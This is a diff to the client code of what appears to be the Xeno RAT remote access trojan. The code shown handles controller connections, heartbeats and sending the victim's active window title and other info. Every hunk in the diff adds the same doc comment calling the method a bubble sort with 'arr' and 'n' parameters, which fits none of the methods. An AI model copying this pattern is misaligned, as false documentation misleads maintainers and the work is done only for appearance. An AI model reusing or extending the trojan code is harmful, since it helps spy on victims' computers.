@@ -18,6 +18,12 @@ namespace xeno_rat_client
             dllhandler = _dllhandler;
             Main = _Main;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task CreateSubSock(byte[] data)
         {
             try
@@ -46,11 +52,22 @@ namespace xeno_rat_client
                 Console.WriteLine("error with subnode, subnode type=" + data[1]);
             }
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private void OnDisconnect(Node SubNode) 
         { 
             
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task GetAndSendInfo(Node Type0) 
         {
             if (Type0.SockType != 0) 
@@ -74,6 +91,11 @@ namespace xeno_rat_client
             await Type0.SendAsync(data);
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task Type0Receive()
         {
             while (Main.Connected())
@@ -106,6 +128,12 @@ namespace xeno_rat_client
             }
             Main.Disconnect();
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task Type1Receive(Node subServer)
         {
             byte[] HearbeatReply = new byte[] { 1 };
@@ -130,6 +158,12 @@ namespace xeno_rat_client
             Main.Disconnect();
             subServer.Disconnect();
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         private async Task setSetId(Node subServer, byte[] data) 
         {
             byte[] worked = new byte[] { 1 };
@@ -137,6 +171,12 @@ namespace xeno_rat_client
             await subServer.SendAsync(worked);
 
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task Type2Receive(Node subServer)
         {
             while (subServer.Connected() && Main.Connected())
@@ -170,6 +210,11 @@ namespace xeno_rat_client
             subServer.Disconnect();
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task DebugMenu(Node subServer, byte[] data) 
         {
             int opcode = data[1];
@@ -194,6 +239,11 @@ namespace xeno_rat_client
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async Task SendUpdateInfo(Node node) 
         {
             string currwin = await Utils.GetCaptionOfActiveWindowAsync();
